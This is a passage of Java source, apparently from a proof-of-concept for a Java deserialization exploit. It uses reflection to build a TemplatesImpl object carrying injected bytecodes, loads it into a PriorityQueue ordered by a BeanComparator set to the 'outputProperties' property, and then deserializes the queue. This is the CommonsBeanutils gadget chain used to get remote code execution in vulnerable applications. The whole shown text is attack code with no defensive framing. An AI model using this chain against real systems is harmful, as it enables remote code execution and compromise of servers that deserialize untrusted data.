        TransformerFactoryImpl fac = new TransformerFactoryImpl();
        Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Constructor constructor = clazz.getDeclaredConstructor(byte[][].class,String.class,Properties.class,int.class,TransformerFactoryImpl.class);
        constructor.setAccessible(true);
        TemplatesImpl obj = (TemplatesImpl) constructor.newInstance(_bytecodes,transletName,pro,1,fac);


        BeanComparator beanComparator = new BeanComparator();

        PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(1);



        refMethod.setValue(priorityQueue,"queue",new Object[]{obj,obj});
        refMethod.setValue(beanComparator,"property","outputProperties");


        deseriazler.deserialize(priorityQueue);

    }
}

```

